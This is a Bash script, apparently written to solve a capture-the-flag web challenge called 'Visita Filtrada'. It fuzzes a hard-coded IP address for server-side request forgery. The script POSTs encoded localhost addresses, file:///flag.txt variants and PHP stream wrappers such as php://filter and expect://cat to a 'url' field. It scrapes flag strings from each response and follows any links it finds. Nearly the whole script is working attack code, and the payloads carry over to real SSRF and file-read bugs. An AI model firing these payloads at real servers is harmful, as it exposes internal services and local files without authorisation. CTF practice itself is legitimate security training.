#!/usr/bin/env bash
# try_visita_filtrada.sh — fuzz de bypass para "Visita Filtrada"
set -euo pipefail

TARGET="http://20.102.93.39:33325/"
OUTDIR="vf_results"
mkdir -p "$OUTDIR"

# Só vamos usar POST e campo 'url' (foi o que funcionou na anterior)
FIELD="url"

# Representações de localhost (HTTP interno / possíveis /flag endpoints)
LOCAL_FORMS=(
  "http://127.0.0.1/flag"
  "http://127.0.0.1/flag.txt"
  "http://127.1/flag"
  "http://127.1/flag.txt"
  "http://2130706433/flag"        # 127.0.0.1 decimal
  "http://2130706433/flag.txt"
  "http://0/flag"
  "http://0/flag.txt"
  "http://0177.0.0.1/flag"        # octal
  "http://0177.0.0.1/flag.txt"
  "http://0x7f000001/flag"        # hex
  "http://0x7f000001/flag.txt"
  "http://[::1]/flag"
  "http://[::1]/flag.txt"
  "http://localhost/flag"
  "http://localhost/flag.txt"
)

# Variações de file:///flag.txt + encodes e cases
FILE_FORMS=(
  "file:///flag.txt"
  "FILE:///flag.txt"
  "file:/flag.txt"
  "file:////flag.txt"
  "file://localhost/flag.txt"
  "file://127.0.0.1/flag.txt"
  "%66%69%6c%65%3a///flag.txt"                 # URL-encoded 'file:'
  "%2566%2569%256c%2565%253a///flag.txt"      # double-encoded
  "fIlE:///flag.txt"
  "file:///./flag.txt"
  "file:///../flag.txt"
)

# Wrappers/alternativas se for PHP/cURL habilitando streams
WRAPPERS=(
  "php://filter/convert.base64-encode/resource=/flag.txt"
  "php://filter/read=convert.base64-encode/resource=/flag.txt"
  "php://filter/resource=/flag.txt"
  "compress.zlib:///flag.txt"
  "zip://flag.zip#flag.txt"                  # só se existir
  "expect://cat%20/flag.txt"
  "dict://127.0.0.1:80/flag.txt"
  "ftp://127.0.0.1/flag.txt"
)

# Une tudo numa lista de payloads
PAYLOADS=("${FILE_FORMS[@]}" "${WRAPPERS[@]}" "${LOCAL_FORMS[@]}")

extract_flag() {
  # extrai IDP{...} de um arquivo
  grep -oP 'IDP\{[^}]*\}' "$1" 2>/dev/null | head -n1 || true
}

try_one() {
  local payload="$1"
  local ts out link flag flag2
  ts=$(date +"%Y%m%d_%H%M%S")
  out="${OUTDIR}/resp_${ts}_$(echo "$payload" | sed 's/[^A-Za-z0-9]/_/g').html"

  echo "[*] POST $FIELD=$payload"
  curl -s -m 15 -X POST "$TARGET" -d "${FIELD}=${payload}" -o "$out" || true

  flag=$(extract_flag "$out")
  if [[ -n "$flag" ]]; then
    echo ">>> FLAG: $flag"
    echo "$flag" > "${OUTDIR}/last_flag.txt"
    echo "[salvo em $out]"
    return 0
  fi

  # Se a resposta tiver link (webhook/URL temporária), baixa também
  link=$(grep -oP 'https?://[0-9A-Za-z./:?=&_%#-]+' "$out" | head -n1 || true)
  if [[ -n "$link" ]]; then
    echo "    link encontrado: $link"
    local out2="${OUTDIR}/follow_${ts}.html"
    curl -s -m 15 "$link" -o "$out2" || true
    flag2=$(extract_flag "$out2")
    if [[ -n "$flag2" ]]; then
      echo ">>> FLAG (no link): $flag2"
      echo "$flag2" > "${OUTDIR}/last_flag.txt"
      echo "[salvo em $out2]"
      return 0
    fi
  fi
  return 1
}

found=0
for p in "${PAYLOADS[@]}"; do
  if try_one "$p"; then
    found=1
    break
  fi
done

if [[ "$found" -eq 1 ]]; then
  echo "Flag capturada. Veja ${OUTDIR}/last_flag.txt"
  exit 0
else
  echo "Nenhuma flag ainda. Resultados em ${OUTDIR}/"
  echo "Sugestões: rode novamente; troque nomes de campo (url|target|u); ou ative modo loop:"
  echo "    while true; do bash $0 && break || sleep 8; done"
  exit 2
fi